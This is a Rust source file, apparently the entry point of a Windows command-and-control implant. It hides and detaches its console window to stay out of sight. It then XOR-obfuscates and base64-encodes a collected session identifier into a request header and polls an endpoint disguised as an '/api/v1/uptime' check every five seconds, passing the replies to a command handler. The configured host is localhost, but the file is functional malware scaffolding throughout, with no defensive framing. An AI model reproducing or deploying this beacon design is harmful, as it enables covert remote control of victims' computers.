mod network;
mod system_info;
mod command_handler;
mod utils;

use network::handle_response;
use system_info::get_cookie;
use utils::xor;

use std::time::Duration;
use tokio::time::sleep;
use reqwest::Client;
use reqwest::Error;
use winapi::um::winuser;
use winapi::um::wincon;
use winapi::shared::windef::HWND;

#[tokio::main]
async fn main() -> Result<(), Error> {
    // Hide the console window
    unsafe {
        let console_window: HWND = wincon::GetConsoleWindow();
        if !console_window.is_null() {
            winuser::ShowWindow(console_window, winuser::SW_HIDE);
        }
    }
    unsafe {
        wincon::FreeConsole();
    }
    // Config
    let ip = "127.0.0.1";
    let port = "23000";
    let url_path = "/api/v1/uptime";
    let protocol = "http";

    let session_id = get_cookie();
    let mut session_id_bytes = session_id.into_bytes();
    xor(&mut session_id_bytes);
    let encoded_session_id = base64::encode(&session_id_bytes);

    let url = format!("{}://{}:{}{}", protocol, ip, port, url_path);
    let client = Client::new();

    loop {
        let res = client.get(&url)
            .header("X-Session-Id", &encoded_session_id)
            .send()
            .await;

        handle_response(res).await;
        sleep(Duration::from_secs(5)).await;
    }
}
